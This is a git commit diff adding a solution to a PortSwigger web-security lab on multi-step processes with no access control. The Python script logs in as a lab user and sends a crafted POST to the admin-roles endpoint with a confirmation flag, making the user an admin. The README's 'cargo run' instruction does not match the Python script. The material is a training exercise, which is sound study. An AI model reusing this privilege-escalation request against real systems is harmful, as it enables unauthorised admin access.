719be3d0d46b2e6656e5758a382f046655385576
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-05 22:53:18 +0300

    Added 'Multi-step process with no access control on one step' lab

---
+++ Access control vulnerabilities/multi_step_process_with_no_access_control_on_one_step/README.md
@@ -0,0 +1,21 @@
+# Hack Steps
+
+1. Login as wiener
+2. Upgrade wiener to be an admin bypassing first step
+
+# Run Script
+
+1. Change the URL of the lab
+2. Start script
+
+```
+~$ cargo run
+```
+
+# Expected Output
+
+```
+1. Logging in as wiener.. OK
+2. Upgrading wiener to be an admin bypassing first step.. OK
+[#] Check your browser, it should be marked now as solved
+```
--- Access control vulnerabilities/multi_step_process_with_no_access_control_on_one_step/multi_step_process_with_no_access_control_on_one_step.py
+++ Access control vulnerabilities/multi_step_process_with_no_access_control_on_one_step/multi_step_process_with_no_access_control_on_one_step.py
@@ -4,10 +4,10 @@
 #
 # Date: 5/9/2023
 #
-# PortSwigger LAB: Method-based access control can be circumvented
+# PortSwigger LAB: Multi-step process with no access control on one step
 #
 # Steps: 1. Login as wiener
-#        2. Upgrade wiener to be an admin via GET method instead of POST
+#        2. Upgrade wiener to be an admin bypassing first step
 #
 ##########################################################################
 
@@ -18,7 +18,7 @@ import requests
 from colorama import Fore
 
 # change this url to your lab
-url = "https://0af6006b04db984a81824332009600da.web-security-academy.net"
+url = "https://0a2e009703e633a78243512f006800f2.web-security-academy.net"
 
 
 try:  # login as wiener
@@ -31,12 +31,17 @@ try:  # login as wiener
         print(
             Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
         session = login.cookies.get("session")
-        try:  # upgrade wiener to be an admin via GET method instead of POST
+        try:  # upgrade wiener to be an admin bypassing the first step
             cookies = {"session": session}
-            upgrade_wiener = requests.get(
-                f"{url}/admin-roles?username=wiener&action=upgrade", cookies=cookies)
+            data = {
+                "username": "wiener",
+                "action": "upgrade",
+                "confirmed": "true"
+            }
+            upgrade_wiener = requests.post(
+                f"{url}/admin-roles", data, cookies=cookies)
             print(
-                Fore.WHITE + "2. Upgrading wiener to be an admin via GET method instead of POST.. " + Fore.GREEN + "OK")
+                Fore.WHITE + "2. Upgrading wiener to be an admin bypassing first step.. " + Fore.GREEN + "OK")
             print(
                 Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
         except:
